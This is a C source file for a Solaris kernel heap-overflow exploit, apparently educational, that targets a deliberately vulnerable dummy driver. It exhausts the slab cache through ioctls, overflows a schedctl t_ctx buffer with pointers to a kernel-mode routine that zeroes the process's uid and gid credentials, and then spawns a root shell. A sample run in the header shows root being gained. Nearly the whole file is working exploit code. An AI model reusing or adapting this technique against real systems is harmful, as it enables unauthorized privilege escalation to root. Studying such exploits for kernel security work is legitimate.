/*
 * hexpl.c - Solaris kernel heap overflow exploit
 *  
 * This exploit targets the vulnerable dummy driver, presenting a real word
 * vector to exploit a traditional heap (SLAB) overflow.
 *
 * Compile with:
 *  cc -o h hexpl.c -lsched -m64 -lkstat
 * "hexpl.c", line 232: warning: statement not reached
 * (yeah, that's just being lazy...)
 *
 * ...and run:
 *
 * luser@opensolaris:/tmp$ ./h
 * [+] Getting process 1718 kernel address
 * [+] proc_t at ffffff00eee49078
 * [+] raise_cred at 401680
 * [+] 72 free buffers in 491 slabs
 * [+] Exhausting the slab cache...
 * [+] Force a t_ctx allocation
 * [+] Triggering the overflow over t_ctx
 * [+] Entering interactive session...
 * luser@opensolaris:/tmp# id
 * uid=0(root) gid=0(root) groups=0(root),10(staff)
 */

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/schedctl.h>
#include <sys/proc.h>
#include <sys/thread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <strings.h>
#include <schedctl.h>
#include <fcntl.h>
#include <kstat.h>
#include <unistd.h>

#include "dummymod.h"

#define DUMMY_FILE	"/devices/pseudo/dummy@0:0"

/* Synchronization variables */
static int		do_ctx_alloc, do_ovf, trigger_it;
unsigned long		my_address;
int			cred_raised = 0;

#define	PSINFO_PATH	"/proc/self/psinfo"

typedef struct psinfo {
        int     pr_flag;        /* process flags (DEPRECATED; do not use) */
        int     pr_nlwp;        /* number of active lwps in the process */
        pid_t   pr_pid;         /* unique process id */
        pid_t   pr_ppid;        /* process id of parent */
        pid_t   pr_pgid;        /* pid of process group leader */
        pid_t   pr_sid;         /* session id */
        uid_t   pr_uid;         /* real user id */
        uid_t   pr_euid;        /* effective user id */
        gid_t   pr_gid;         /* real group id */
        gid_t   pr_egid;        /* effective group id */
        uintptr_t pr_addr;      /* address of process */
        size_t  pr_size;        /* size of process image in Kbytes */
        size_t  pr_rssize;      /* resident set size in Kbytes */
} psinfo_t;

typedef struct cred {
        uint_t          cr_ref;         /* reference count */
        uid_t           cr_uid;         /* effective user id */
        gid_t           cr_gid;         /* effective group id */
        uid_t           cr_ruid;        /* real user id */
        gid_t           cr_rgid;        /* real group id */
        uid_t           cr_suid;        /* "saved" user id (from exec) */
        gid_t           cr_sgid;        /* "saved" group id (from exec) */
} kcred_t;


/* Retrieve the kernel address of the current process. */
unsigned long get_curr_kaddr()
{
	psinfo_t        info;
	int             fd;
	
	fd = open(PSINFO_PATH, O_RDONLY);
	if ( fd == -1) {
		perror("[-] Failed opening psinfo path");
		return (0);
	}
	
	read(fd, (char *)&info, sizeof (info));
	close(fd);
	return info.pr_addr;
}

/* heap exported kstats are all 64-bit unsigned integers. */
uint64_t get_ui64_val(kstat_t *kt, char *name)
{
	kstat_named_t			*entry;
	
	entry = kstat_data_lookup(kt, name);
	if (entry == NULL)
		return (-1);

	return (entry->value.ui64);
}

/* Simple kernel shellcode to raise current process credentials. */
int raise_cred ()
{
	proc_t	*p = (proc_t *)my_address;
	kcred_t	*cred = p->p_cred;
	kthread_t *k = p->p_tlist;
	
	if (cred_raised)
		return 0;
	
	cred->cr_uid = cred->cr_ruid = cred->cr_suid = 0;
	cred->cr_gid = cred->cr_rgid = cred->cr_sgid = 0;
	/* cleanup t_ctx */
	k->t_ctx = 0;
	cred_raised = 1;
	
	return 0;
}

/* Run a shell... */
void spawn_shell()
{
	setuid(0);
	setgid(0);
	seteuid(0);
	
	execl("/bin/bash", "bash", NULL);
}


/*
 * A bunch of MAGIC numbers here and there... but should give the idea.
 */
int main(int argc, char **argv)
{
	int                     fd;
	int                     ret;
	int                     i = 0, rounds = 5;
	struct test_request	req;
	unsigned long           *pbuf, retaddr, p_addr;
	kstat_ctl_t		*kh;
	kstat_t			*slab_info;
	uint64_t		start_avail_buf = 0, curr_avail_buf = 0;
	uint64_t		buf_constructed = 0;
	uint64_t		start_create_slabs = 0, curr_create_slabs = 0;
	char			buf[200];
	
	fprintf(stdout, "[+] Getting process %d kernel address\n", getpid());
	my_address = get_curr_kaddr();
	if (my_address == 0)
		exit(EXIT_FAILURE);

	fprintf(stdout, "[+] proc_t at %p\n", my_address);
	fprintf(stdout, "[+] raise_cred at %p\n", raise_cred);
	
	/* Open the libkstat handle. */
	kh = kstat_open();
	if (kh == NULL) {
		fprintf(stderr, "Unable to open /dev/kstat handle...\n");
		exit(EXIT_FAILURE);
	}
	
	/* Lookup the values to monitor during the attack. */
	slab_info = kstat_lookup(kh, "unix", 0, "kmem_alloc_64");
	if (slab_info == NULL) {
		fprintf(stderr, "Unable to find slab kstats...\n");
		exit(EXIT_FAILURE);
	}
	kstat_read(kh, slab_info, NULL);  
	
	/*
	 * Lookup the number of available buffers and the number of allocated
	 * slabs.
	 */
	start_avail_buf = get_ui64_val(slab_info, "buf_avail");
	start_create_slabs = get_ui64_val(slab_info, "slab_create");
	buf_constructed = get_ui64_val(slab_info, "buf_constructed");
	
	printf("[+] %d free buffers in %d slabs\n", start_avail_buf,
	    start_create_slabs);

	/* You know, just to add that little suspense...*/
	sleep(2);
	
	fd = open(DUMMY_FILE, O_RDONLY);
	if (fd == -1) {
		perror("[-] Open of device file failed");
		exit(EXIT_FAILURE);
	}
	
	i = 0;
	kstat_read(kh, slab_info, NULL);  
	curr_create_slabs = get_ui64_val(slab_info, "slab_create");
	printf("[+] Exhausting the slab cache...\n");
	while (curr_create_slabs <= start_create_slabs + rounds) {
		bzero(&req, sizeof(struct test_request));
		req.size = 64;
		ret = ioctl(fd, TEST_ALLOC_SLAB_BUF, &req);
		kstat_read(kh, slab_info, NULL);  
		curr_create_slabs = get_ui64_val(slab_info, "slab_create");
	}
	
	/* Do five allocations, as a test (strictly not necessary...) */
	for (i = 0; i < 5; i++) {
		bzero(&req, sizeof(struct test_request));
		req.size = 64;
		ret = ioctl(fd, TEST_ALLOC_SLAB_BUF, &req);
	}
	
	/* Free and re-alloc the same buffer. */
	ioctl(fd, TEST_FREE_SLAB_BUF, &req);
	bzero(&req, sizeof(struct test_request));
	req.size = 128;
	
	fprintf(stdout, "[+] Force a t_ctx allocation\n");
	schedctl_init();
	fflush(stdout);

	memset(buf, 'A', sizeof(buf) -1);	
	pbuf = (unsigned long *)(buf + 64);
	*pbuf++ = (unsigned long)raise_cred;
	*pbuf++ = (unsigned long)raise_cred;
	
	fprintf(stdout, "[+] Triggering the overflow over t_ctx\n");
	req.size = 80;
	req.addr = (uintptr_t)buf;
	ret = ioctl(fd, TEST_SLABOVF, &req);
	
	while (1) {
		if (cred_raised == 1) {
			fprintf(stdout, "[+] Entering interactive session...\n");
			/* jackpot. */
			spawn_shell();
		}
	}
	
	/*
	 * NOTREACHED -- a cleaner exploit may try for a certain amount of
	 * time and then exit down here.
	 */
	close(fd);
	kstat_close(kh);
	exit(EXIT_SUCCESS);
}
